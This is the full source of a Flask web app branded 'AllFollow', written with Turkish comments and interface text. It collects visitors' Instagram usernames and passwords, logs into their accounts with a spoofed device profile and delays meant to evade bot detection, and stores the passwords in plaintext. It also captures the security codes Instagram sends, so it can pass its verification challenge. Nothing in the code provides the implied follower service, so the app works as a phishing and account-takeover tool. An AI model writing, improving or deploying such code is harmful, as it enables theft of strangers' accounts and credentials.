import os
import time
import random
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client
from instagrapi.exceptions import ChallengeRequired, BadPassword, LoginRequired
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

# Bağlantı sorunlarını minimuma indirmek için proxy şimdilik None
PROXY_URL = None 

active_sessions = {}

class IGAccount(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True, nullable=False)
    password = db.Column(db.String(100), nullable=False)
    status = db.Column(db.String(100), default="Bekliyor")

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/login', methods=['POST'])
def login_api():
    data = request.json
    u, p = data.get('u'), data.get('p')
    cl = Client()
    
    # Giriş şansını artırmak için rastgele gecikme ve cihaz simülasyonu
    cl.set_device_settings({
        "app_version": "269.0.0.18.75",
        "android_version": 26,
        "android_release": "8.0.0",
        "dpi": "480dpi",
        "resolution": "1080x1920",
        "manufacturer": "samsung",
        "device": "SM-G950F",
        "model": "dreamqlte",
        "cpu": "samsungexynos8895",
        "version_code": "442431182"
    })
    
    if PROXY_URL:
        try:
            cl.set_proxy(PROXY_URL)
        except:
            pass
            
    active_sessions[u] = cl
    
    try:
        print(f"DEBUG: {u} için giriş deneniyor...")
        # Instagram'ın botu anlamaması için kısa bir bekleme
        time.sleep(random.uniform(1, 3))
        
        if cl.login(u, p):
            acc = IGAccount.query.filter_by(username=u).first()
            if not acc:
                acc = IGAccount(username=u, password=p, status="AKTIF")
                db.session.add(acc)
            else:
                acc.status = "AKTIF"
            db.session.commit()
            return jsonify(status="success", next_step="dashboard")
            
    except BadPassword:
        return jsonify(status="error", message="Şifre Yanlış! Lütfen kontrol edin.")
    except ChallengeRequired:
        return jsonify(status="challenge", next_step="verify")
    except Exception as e:
        err_msg = str(e).lower()
        print(f"LOG: {err_msg}")
        if "checkpoint" in err_msg or "challenge" in err_msg:
            return jsonify(status="challenge", next_step="verify")
        if "feedback_required" in err_msg:
            return jsonify(status="error", message="Instagram çok fazla deneme yaptığınızı algıladı. 15 dk bekleyin.")
        return jsonify(status="error", message="Bağlantı Reddildi. (IP Engeli)")

@app.route('/api/verify', methods=['POST'])
def verify_api():
    data = request.json
    u, code = data.get('u'), data.get('code')
    cl = active_sessions.get(u)
    if not cl: return jsonify(status="error", message="Oturum Zaman Aşımı")
    try:
        cl.challenge_set_code(code)
        acc = IGAccount.query.filter_by(username=u).first()
        if acc:
            acc.status = "AKTIF"
            db.session.commit()
        return jsonify(status="success", next_step="dashboard")
    except Exception:
        return jsonify(status="error", message="Kod hatalı veya süresi doldu.")

# --- UI (MODERN VE HATASIZ) ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AllFollow</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
        .glass { background: #121212; border: 1px solid #333; padding: 2rem; border-radius: 1.5rem; width: 100%; max-width: 350px; text-align: center; }
        .page { display: none; } .active { display: block; }
        input { width: 100%; background: #1f1f1f; border: 1px solid #333; padding: 0.8rem; border-radius: 0.75rem; color: #fff; margin-bottom: 1rem; outline: none; font-size: 14px; }
        input:focus { border-color: #a855f7; }
        button { width: 100%; background: #a855f7; color: #fff; font-weight: bold; padding: 0.8rem; border-radius: 0.75rem; border: none; cursor: pointer; transition: 0.3s; }
        button:disabled { opacity: 0.5; }
        .loader { border: 2px solid #f3f3f3; border-top: 2px solid #a855f7; border-radius: 50%; width: 16px; height: 16px; animation: spin 1s linear infinite; display: inline-block; vertical-align: middle; margin-right: 8px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div id="login-page" class="page active glass">
        <h1 style="color: #a855f7; font-weight: 900; font-style: italic; font-size: 24px; margin-bottom: 1.5rem;">ALLFOLLOW</h1>
        <input id="u" placeholder="Kullanıcı Adı">
        <input id="p" type="password" placeholder="Şifre">
        <button onclick="handleLogin()" id="btn">GİRİŞ YAP</button>
        <p id="err" style="color: #ef4444; font-size: 11px; margin-top: 1rem; font-weight: bold;"></p>
    </div>

    <div id="verify-page" class="page glass">
        <h2 style="color: #f59e0b; margin-bottom: 1rem;">Güvenlik Kodu</h2>
        <p style="font-size: 12px; color: #888; margin-bottom: 1.5rem;">Instagram'dan gelen kodu girin.</p>
        <input id="vcode" placeholder="000000" style="text-align: center; font-size: 24px; letter-spacing: 5px;">
        <button onclick="handleVerify()" id="vbtn" style="background: #f59e0b;">ONAYLA</button>
    </div>

    <div id="dashboard-page" class="page glass" style="border-top: 4px solid #22c55e;">
        <h2 style="color: #22c55e; margin-bottom: 0.5rem;">Giriş Başarılı ✅</h2>
        <p id="final-user" style="font-weight: bold; margin-bottom: 1.5rem;"></p>
        <button onclick="location.reload()" style="background: #333;">ÇIKIŞ YAP</button>
    </div>

    <script>
        async function handleLogin() {
            const u = document.getElementById('u').value, p = document.getElementById('p').value;
            const btn = document.getElementById('btn'), err = document.getElementById('err');
            if(!u || !p) return;
            btn.disabled = true; btn.innerHTML = '<div class="loader"></div> BAĞLANIYOR...';
            err.innerText = "";
            try {
                const r = await fetch('/api/login', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({u, p})
                });
                const d = await r.json();
                if(d.status === "success") {
                    showPage('dashboard-page');
                    document.getElementById('final-user').innerText = "@" + u;
                } else if(d.status === "challenge") {
                    showPage('verify-page');
                } else {
                    err.innerText = d.message;
                    btn.disabled = false; btn.innerText = "GİRİŞ YAP";
                }
            } catch {
                err.innerText = "Bağlantı Hatası!";
                btn.disabled = false; btn.innerText = "GİRİŞ YAP";
            }
        }

        async function handleVerify() {
            const code = document.getElementById('vcode').value, u = document.getElementById('u').value;
            const btn = document.getElementById('vbtn');
            btn.disabled = true; btn.innerText = "ONAYLANIYOR...";
            const r = await fetch('/api/verify', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({u, code})
            });
            const d = await r.json();
            if(d.status === "success") {
                showPage('dashboard-page');
                document.getElementById('final-user').innerText = "@" + u;
            } else {
                alert(d.message);
                btn.disabled = false; btn.innerText = "ONAYLA";
            }
        }

        function showPage(id) {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            document.getElementById(id).classList.add('active');
        }
    </script>
</body>
</html>
"""

if __name__ == "__main__":
    with app.app_context(): db.create_all()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
